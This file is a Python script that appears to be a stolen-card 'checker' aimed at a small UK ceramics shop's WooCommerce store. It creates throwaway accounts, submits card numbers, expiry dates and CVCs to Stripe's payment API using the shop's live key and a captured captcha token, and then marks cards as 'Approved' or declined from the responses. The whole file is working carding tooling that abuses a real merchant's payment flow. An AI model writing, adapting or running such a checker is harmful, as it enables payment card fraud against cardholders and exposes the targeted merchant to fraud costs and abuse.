import requests
import re
import time
import random
import re,json
import string
import base64
from bs4 import BeautifulSoup
import user_agent
import pyfiglet
import os
import webbrowser
from colorama import Fore
from getuseragent import UserAgent
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
	    'authority': 'kateceramics.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://kateceramics.co.uk/shop/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	headers = {
	    'authority': 'kateceramics.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://kateceramics.co.uk',
	    'referer': 'https://kateceramics.co.uk/shop/my-account/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	data = {
	    'email': acc,
	    'mailchimp_woocommerce_newsletter': '1',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '(none)',
	    'wc_order_attribution_utm_creative_format': '(none)',
	    'wc_order_attribution_utm_marketing_tactic': '(none)',
	    'wc_order_attribution_session_entry': 'https://kateceramics.co.uk/shop/my-account/',
	    'wc_order_attribution_session_start_time': '2024-09-05 08:33:21',
	    'wc_order_attribution_session_pages': '3',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/shop/my-account/',
	    'register': 'Register',
	}
	
	response = r.post('https://kateceramics.co.uk/shop/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'authority': 'kateceramics.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://kateceramics.co.uk/shop/my-account/payment-methods/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://kateceramics.co.uk/shop/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': user,
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=gdjdhdjdhdggidjdi%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b3cbdc8c-14a9-4fcb-8f0d-a44b74b1d2ac6fe321&muid=fad50f36-1d0d-4a3a-b45e-d003ae103f5224b13d&sid=f8c2d285-0f61-484d-86f8-3426ec0d2f82889eee&payment_user_agent=stripe.js%2F019cc90856%3B+stripe-js-v3%2F019cc90856%3B+split-card-element&referrer=https%3A%2F%2Fkateceramics.co.uk&time_on_page=268212&key=pk_live_grUdPDX9NpsH5JXv95OPaVzZ00MrLKuoNw&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZnZ1eXN2U25MeWFUSDN6ZUpQd3VkT3ZBbkJwNnhUWi91VXNEYkZtNW5QbkxpdkJKZXdRcjFtdVF0NFdWREdUZXpDYUlSVWd0VXFlWVl1R1FlUHlYcEFhWmw2WXlPWFd3Wm9kTFJNQWU3eC91M0tZVG1TUm0xMHd5dnZlMWpOcHRPUllmTVhzMWM0Vi9vWFpodldhVU8yYVovK0g4T05GMGhKVXdleUwybFVCWTJramRQdCs1dTZMcHFNWlhxMmhEcUlJSS9iMytzZFdrSGpYTVdzSVlKLzhQRzlRUVRhTDhESUZPdERLOFcvVHRBcExGUFFkTmdlWTJNWFYvODF3YU5UR0hNRzgwV25EeWZXY3NQZ20ybUhHY2RNZlg5ZzNmT094eS9QYmxNaHYvSU5TMm5USTRnaUJMcEYvenpOZEV0ZWVHOEhRMU5SNHBkSEUzOXY3OWpCczNsOXkrMmRrMlRBcnRKTmViaEZKcTB6YjZ2Y1NvYWpFKzN5L29tQTR1WWh0THFEV2tWb2FtMFpDSHJHMzUzZFAxcWloU256T1JVemRIWU9YKys1QW5xWFB5RkJrc3NXNjA3NzlhOFcrZi9sdlFxVGp2My9jMmx0c2Nhb0dQeHp0UThWVXhOL3ZaSit4RG5ReldYQzhrWENIOEF5T0Y2cWI1emd4NnludTZ2TG9lbDk0V2VQNTRXRHZzS1RpbmRVMDl0NTllbUFtN1VTNDJOYUxxb0VCZFh6L3ZRU1NuaU0yK1psRzZITEVNazlXU0J0a2x4LzRBRlZGQ1o3Ly8yVEtvQkdTd1lKNVRVQkJJUTA1Y1ZaQkVNWDlKQ09tTGJqblhlM1BPbzNva3RqZ0Y3c0MvWkFlNFY2QjRQMHRRdmlyaitVRWp1S3dsVjNZM1BSZHl6K1UxQ1dxRUdVOTJxRG1SdjRESjVJdmR0RjlKWjV5ZHVEckpENGkzOThXellUTHRNek84Qi9kRDF6WkREQWt6azlUTkp6cGlnY1QxVTIrc1VVYzczcFpaZ0dYeTdLNU5pU3BSVDhHWGQycnk2UTFGYkNyejg1blJRUDJTK1BDZnYrZURvMjZUZFNZL21IdnFheUZQTWMyMmtCL0FHaUtNK28rUWZkOFM5Ykx6ZUhHSFdhSXQxZGdrd2Z2TXdzckNPZVNNL0pDa08vemNtMHFJQ0dGMTIwbnIxZXBHYVpSbC9Gc2gxdlhmaXhIa2ZHdjM4azhUaHFGU1I0VU9UejRtNTJZeXYvNHRIdjhoSk93THk5aDNhcmtkT2tQL2ZNdy9ibVk5ZWNFaktYZFRwbE4xU29GZEVCbnYvS3g4amNienpoV3cyb3dyMzVPcEEzcDFDdHRoSEhyRXk0dzJaNDRCUFZPdHF4QWlSZ0Vaa2grOWtKWHNCUmVzZGNNdHpHSzZ2R2Vrb2M0a3hTTU8xQlpMc3pFYVl3QjFHTDZuZjUzYXJTUXBaSG1DRFZncFJKRzVDN0l6MktSdzlSZU9UWlVJckZXT0k3TVNZYmhybEdCV2RIWWxRaHErL2RJMTdqbmJJTFdoVVJmcU9UUWpzVWpwY05zUTZiU1daWXJFWURLUnVFTi9qVXpzaWR5MjlDekVGdW14cTlndnhuZ0huWUkzVnJoVG9mTHRLVy92czkzL2dTSXhWWjVmamh2bVlVNm5iaTIrYUVZcWgwODI5WGxEMzQ0V0lNK2dUUnVYTVBDMWt1ay9FYmpYVlJnbzZucm1xWjdCOHhYVDU0dC82djlPbjVObnRmblFKZ2g1QVdFZGdpWXk0blIrMXlpTnV0T25aOCtPOXFZcVNrRDgvTVE4YUEwTzJzN3V3TnVxWHVCVWYwZlZ5RzVlN2hjRWwwMUVSQjM2WEoyZnZ3ZFJWbmNqcEVMdEFuU2pjRW9OZXFHUERaSjZ6d1BYeDJFWmZ5SHR6QU1kVC9TRG1abm9aVnZwb0hvYlQ2SXlmZFNabVczYkdvMHZDcVhxSzNuT1Vsb3BkREhQN2hyVTNZTi9mVzZvN0pPV1lNVDg5bFBsTXhZb3pJeklWOTllbU1ZeUZvRTBwblZwc3BHNmNKSVhRNW5la2Z5M1A1TDVBVkZZSmZaNWtHZVhUQXRhQytycjNpenhNOFI5SllreG8vbmpzUkk0b0tocTJXN28yUU1TNU5nd0ZsT0MzeEZjQ3YrUnJFaGVvVGNMMitkd3VTMkdSZlFVV2plSFBhT0ZkZGU4TlRHeFlqamFic1dTWTJyUURhdkV2NnN4Ym94dEpqMkxqMnB0cEZ0ZkNhRlFxaUN0RUFTNzVqaTJoTXp4SW95bkxPMDNQNTRmdk9GOU5FZ3N6eU1HQjBCQ3NaRFB5VDQvSDhpem9BLzAzc0wxNFdiVU92c1RWR0VkVHZTdE9rS0VST2oyV0duczFQR1VrUUlNUEl5alptZmxGQnhZbTdVUmRoZ2d6V2UwSkhaYjFWaTF0b25ZRDJhSWYyRnZaQTJkKzhGcjRPWmhja2hESW5hUk5sN0ljWTh5U2tOQ0kwTHU4WHJLTTRwaWdXSnk1cllwTnZnVndRVjFFNUo4c2V1dDJ1U2hLRXNKRCtJbnN1bDFLbzRPcjk2aUdNWkY0dENzVFZmSFhOaEFUOGhBcGF4L2RBNk1NT25yZUZlV2pleGFJTndUTmVoMUhjRlhsSTZjMStoUDFtWktJOEpLZXU5K2gzRkV0b1RaYzJQYnUzZjhxU2sxaFhLeUgwNmIxTkRhd3orTVY2MzFqdUhDUUJSVTFDQmgvWnBMWDVKVSs0aUZDWUU1Z3ovU2l2STdNSzBNMWFSbHY3SEZMdk5iN294bEY0VUJtUW80WERWdm1td2FQOUFlT202NXQ0cFc5dWxqRDNQYzBRRk0xQUtTQ21KRU5rSUZYeVJQOElDUiIsImV4cCI6MTcyNTUyNTc2OSwic2hhcmRfaWQiOjMzOTUxMDMwMywia3IiOiI0YmFmN2JlMCIsInBkIjowLCJjZGF0YSI6IkJHcFdNMmRhc2w0YThtSUxXVzZiU2NiKzZCKzdESEJqR0dUSUl2ZGhVRURIVURjQlh1UWJjWmV2UG43OG5FdWtpZlhxSHZ4NEhabkFxOEhZNHhCSGwvR0ZOcS85TUpxOEg1NDNOdDlLTG1FaFdzR1Buc1JGOG10Zm92Q3N3TkZhcHNhemdiVzh3T1FiRGVSRk1qamcyUng1UEdIUjh4U0ZDak5MTWt6Z0ltOHg2Nmh3R2E5UzVVV1lRQ1YxeEdLcVVkT3ZveVBkTGxYVkJ4R1gifQ.hqpQhWX621vuHU7nhyVcFreyVaSxR_LPrc4muD0Bd30'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	if not 'id' in response.json():
		print('ERORR CARD')
	else:
		id=response.json()['id']
	
	headers = {
	    'authority': 'kateceramics.co.uk',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://kateceramics.co.uk',
	    'referer': 'https://kateceramics.co.uk/shop/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = r.post('https://kateceramics.co.uk/', params=params, cookies=r.cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'success' in text:
			result = "success"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "declined"
	if 'avs' in result or 'success' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def sq(card):
	return 'ابقي غطيها كويس لما تيجي تنام'